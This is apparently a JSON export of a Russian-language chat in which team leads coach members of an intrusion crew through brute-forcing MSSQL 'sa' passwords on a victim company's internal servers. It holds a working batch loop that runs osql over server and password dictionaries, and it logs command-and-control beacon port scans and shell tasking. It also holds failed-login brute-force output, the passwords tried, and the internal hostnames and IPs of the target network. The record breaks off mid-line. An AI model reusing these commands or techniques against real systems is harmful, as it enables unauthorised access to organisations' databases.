+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T14:05:14.249Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gbN3oHK6ggatZ6vHK",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "лучше проверяйте сразу на дедике",
+      "ts": "2020-10-03T13:51:50.284Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:51:50.320Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hSaGW6oyb6XTmNm3w",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "?",
+      "ts": "2020-10-03T13:51:18.940Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:51:18.974Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZrnKQSYdgDCK2vKit",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nfor /f %s in (srv.txt) do @ \n    for /f %p in (pwd.txt) do @ (osql -S %s -U sa -P %p -Q \"select @@servername\" >> result.txt && echo %s:%p >> result.txt)\n```",
+      "ts": "2020-10-03T13:51:10.859Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:51:10.926Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oX9HaMxoFDapNeTZJ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "кто батники писал?",
+      "ts": "2020-10-03T13:42:18.980Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:42:19.031Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "umKhnduoqYKaTsZyG",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "неа)",
+      "ts": "2020-10-03T13:42:08.269Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:42:08.297Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6yYfv8dcD5DkJiH4o",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "неа",
+      "ts": "2020-10-03T13:41:37.633Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:41:37.684Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jBSbbr3KafiBAS3sF",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "vvv",
+      "ts": "2020-10-03T13:41:24.973Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-03T13:54:04.211Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-03T13:54:04.208Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      },
+      "urls": []
+    },
+    {
+      "_id": "7EzQmxwn4TTBXGASB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и не скажу\nЭто тайна",
+      "ts": "2020-10-03T13:38:12.039Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T13:38:12.065Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eqE6dxLR6dbxFk85N",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я бы обратил внимание на скобки) но мне @tl2 не сказал где ошибка, просто мое предположение что надо еще кое где добавить скобки",
+      "ts": "2020-10-03T13:37:47.801Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:37:47.853Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "Dt7iWz6tjjkNjdbqP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тут все понятно?",
+      "ts": "2020-10-03T13:36:40.264Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:36:40.294Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DbyvnPM8zAMHM5EBD",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "соотв `%s` - переменная от словаря srv.txt. `%p` - переменная от словаря паролей",
+      "ts": "2020-10-03T13:33:54.058Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:33:54.118Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DA7gDePDfGAeJh8o4",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\ndo @ osql -S %s -U sa -P %p -Q \"select @@servername\" >> result.txt && echo %s:%p >> result.txt\n```",
+      "ts": "2020-10-03T13:32:27.634Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:32:27.750Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KiXJ8uzZEwKpF4GbW",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "где в конце",
+      "ts": "2020-10-03T13:32:21.568Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:32:21.612Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YnPMGH6sDPaSWK9BC",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "увидит тут 2 цикла",
+      "ts": "2020-10-03T13:32:18.206Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:32:18.235Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HgvCzsYFYmvWJMXxs",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "кто умеет писать батники или кодить на любом языке",
+      "ts": "2020-10-03T13:32:12.774Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:32:12.816Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WssmcuQYkLuKkGsjH",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "зато умеет делать запросы в бд под доступами",
+      "ts": "2020-10-03T13:31:49.085Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:31:49.112Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PrYitGKjiDnxdtrnm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "osql делает запросы в бд, он сам не перебирает",
+      "ts": "2020-10-03T13:31:34.879Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:31:34.907Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sMTeMFocchBY6ZX48",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ваша задача перебрать их в разных комбинациях",
+      "ts": "2020-10-03T13:31:22.093Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:31:22.138Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eGjfKB5YSmi9GQxed",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у вас есть 2 словаря - srv.txt, pwd.txt",
+      "ts": "2020-10-03T13:31:11.954Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:31:11.985Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vEr6kWiHEC5FH6JmD",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "но не думаю что это требовалось",
+      "ts": "2020-10-03T13:30:57.355Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:30:57.384Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dnLeLEQfAxjL2YgHv",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ладно я объясню первый раз",
+      "ts": "2020-10-03T13:30:50.609Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:30:50.640Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Fu994YjRpkQrou7cy",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "нет)",
+      "ts": "2020-10-03T13:30:44.780Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:30:44.806Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CEE9ZtMh644x8gyhb",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`-Q matches.com` ?",
+      "ts": "2020-10-03T13:30:36.735Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:30:36.776Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3rW7MFw9NWzekv2B4",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=NMnPWq9doKJzA9H6s) а если подумать?",
+      "ts": "2020-10-03T13:29:53.533Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:29:53.558Z",
+      "attachments": [
+        {
+          "text": "```\nfor /f %s in (srv.txt) do @ (for /f %p in (pwd.txt) do @ osql -S %s -U sa -P %p -Q \"select @@servername\" >> result.txt && echo %s:%p >> result.txt)\n``` \nвот чет типа того можно\nно в этой команде где-то есть ошибка ;- )",
+          "author_name": "tl2",
+          "author_icon": "/avatar/tl2",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=NMnPWq9doKJzA9H6s",
+          "attachments": [],
+          "ts": "2020-10-03T12:47:46.974Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=NMnPWq9doKJzA9H6s",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9mKRctvZt6m4z8Abe",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ну чёта вот\n```\nbeacon> shell osql.exe -U sa\n[*] Tasked beacon to run: osql.exe -U sa\n[+] host called home, sent: 45 bytes\n[+] received output:\nPassword: \n```",
+      "ts": "2020-10-03T13:29:33.020Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:29:33.094Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yC7Tgq47XXirYbFkH",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "вопрос в том что запускать",
+      "ts": "2020-10-03T13:28:56.777Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:28:56.810Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KX7Jx46y2QRCipaEq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "то что все должно быть в одной папке верно",
+      "ts": "2020-10-03T13:28:52.435Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:28:52.468Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "32Paa2QwoTyPuBb7E",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "либо в запуске)",
+      "ts": "2020-10-03T13:28:35.593Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:28:35.624Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EGre5uggyshwxMRdq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "либо в сообщении ошибка",
+      "ts": "2020-10-03T13:28:31.841Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:28:31.876Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sdN3oGABaKrr7vWRS",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "всё верно?",
+      "ts": "2020-10-03T13:26:19.118Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:26:19.144Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uamafZAhfepsRShAN",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и просто execute osql.exe",
+      "ts": "2020-10-03T13:26:16.825Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:26:16.857Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zaYogp7pYFHQJTLpR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я на дедик закинул его и в одну папку с ним srv.txt и pwd.txt",
+      "ts": "2020-10-03T13:26:08.437Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:26:08.473Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pLz97Fkqjs9xwDfFj",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "скрипт долго result.txt формировать будет?",
+      "ts": "2020-10-03T13:25:55.007Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:25:55.037Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vMbfFvcAeSXJbGCLm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:PasswordA (Incorrect: )\n\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA (Incorrect: )\n\n```",
+      "ts": "2020-10-03T13:19:28.770Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:19:28.857Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "koAbspB2eWrzLoMM7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "PasswordA€ - похоже на ломаный символ\nPasswordA - попробуйте",
+      "ts": "2020-10-03T13:17:20.645Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T13:17:20.685Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AwTYGy9NgNbAySCTq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:pw08 (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:navproject123 (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Incorrect: )\n[-] 10.10.1.41:61340      - 10.10.1.41:61340 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Incorrect: )\n```",
+      "ts": "2020-10-03T13:16:08.705Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:16:08.941Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MGtd7ss6jwdGvxrnT",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "проверьте еще словарь от @tl2 со скриптом",
+      "ts": "2020-10-03T13:14:56.339Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:14:56.377Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "ZMuXwfxbGrSbxLjij",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:pw08 (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:pw08 (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:navproject123 (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:navproject123 (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Incorrect: )\n[-] 10.5.19.37:1433       - 10.5.19.37:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Incorrect: )\n\n```",
+      "ts": "2020-10-03T13:13:44.837Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:13:45.090Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Dkgieg9cheeurkxcR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "при бруте не забудьте об этом",
+      "ts": "2020-10-03T13:13:15.485Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:13:15.514Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ozJXRRCfNYJ3tQ7jR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "для него кастомный скуль порт значит",
+      "ts": "2020-10-03T13:13:01.983Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:13:02.019Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "C5DGpSkcbMBSceX3L",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "другое дело",
+      "ts": "2020-10-03T13:12:51.430Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:12:51.457Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZCNKMcESYEAByfZQX",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "вооот",
+      "ts": "2020-10-03T13:12:48.029Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:12:48.048Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "n9fyxcGgfxLvSxpWu",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> portscan 10.10.1.41 61340\n[*] Tasked beacon to scan ports 61340 on 10.10.1.41\n[+] host called home, sent: 93245 bytes\n[+] received output:\n(ICMP) Target '10.10.1.41' is alive. [read 8 bytes]\n\n[+] received output:\n10.10.1.41:61340\nScanner module is complete\n```",
+      "ts": "2020-10-03T13:12:43.009Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:12:43.116Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JiYWYJF7NQFF8Kuni",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у второго значит закрыт",
+      "ts": "2020-10-03T13:12:00.178Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:12:00.214Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bqig8zNvZR7WZMLS5",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "проверьте",
+      "ts": "2020-10-03T13:11:49.448Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:11:49.480Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8W32E3qroMeCW4b9B",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "61340",
+      "ts": "2020-10-03T13:11:47.501Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:11:47.536Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Y6BPSFM8gfPm5gmjs",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "скидывайте команда + вывод",
+      "ts": "2020-10-03T13:11:04.193Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:11:04.234Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4PT7MhZoseNE8TXjd",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> portscan 10.10.1.41\n[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 10.10.1.41\n[+] host called home, sent: 93245 bytes\n[+] received output:\n(ICMP) Target '10.10.1.41' is alive. [read 8 bytes]\n10.10.1.41:5985\n10.10.1.41:3389\n10.10.1.41:443\n10.10.1.41:139\n10.10.1.41:135\n10.10.1.41:80\n10.10.1.41:445\n``` \n```\nbeacon> portscan 10.7.18.36\n[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 10.7.18.36\n[+] host called home, sent: 93245 bytes\n[+] received output:\n(ICMP) Target '10.7.18.36' is alive. [read 8 bytes]\n10.7.18.36:5985\n10.7.18.36:3389\n10.7.18.36:135\n10.7.18.36:80\n```",
+      "ts": "2020-10-03T13:10:43.096Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:11:39.999Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-03T13:11:39.997Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "QNczonng5h7CvFWnv",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у первого и последнего проверьте по АД какой порт",
+      "ts": "2020-10-03T13:08:44.746Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T13:08:44.781Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ASWbpbqKJKATSXBgv",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Password: navproject123",
+      "ts": "2020-10-03T13:08:01.105Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T13:08:01.132Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AAdenDwsBqcpbPjG8",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nPinging FORTICLIENTEMS.matches.com [10.10.1.41] with 32 bytes of data:\nReply from 10.10.1.41: bytes=32 time=110ms TTL=121\nReply from 10.10.1.41: bytes=32 time=181ms TTL=121\nReply from 10.10.1.41: bytes=32 time=300ms TTL=121\nReply from 10.10.1.41: bytes=32 time=279ms TTL=121\n\nPing statistics for 10.10.1.41:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 110ms, Maximum = 300ms, Average = 217ms\n\n\n\nPinging EC2AMAZ-U49LCLF.matches.com [10.1.4.4] with 32 bytes of data:\nReply from 10.1.4.4: bytes=32 time=112ms TTL=121\nReply from 10.1.4.4: bytes=32 time=112ms TTL=121\nReply from 10.1.4.4: bytes=32 time=202ms TTL=121\nReply from 10.1.4.4: bytes=32 time=180ms TTL=121\n\nPing statistics for 10.1.4.4:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 112ms, Maximum = 202ms, Average = 151ms\n\n\n\n\nPinging AWS-VPBCSQL03.matches.com [10.5.19.37] with 32 bytes of data:\nReply from 10.5.19.37: bytes=32 time=186ms TTL=121\nReply from 10.5.19.37: bytes=32 time=122ms TTL=121\nReply from 10.5.19.37: bytes=32 time=148ms TTL=121\nReply from 10.5.19.37: bytes=32 time=122ms TTL=121\n\nPing statistics for 10.5.19.37:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 122ms, Maximum = 186ms, Average = 144ms\n\n\n\nPinging AWS-VTBIMSTRI03.matches.com 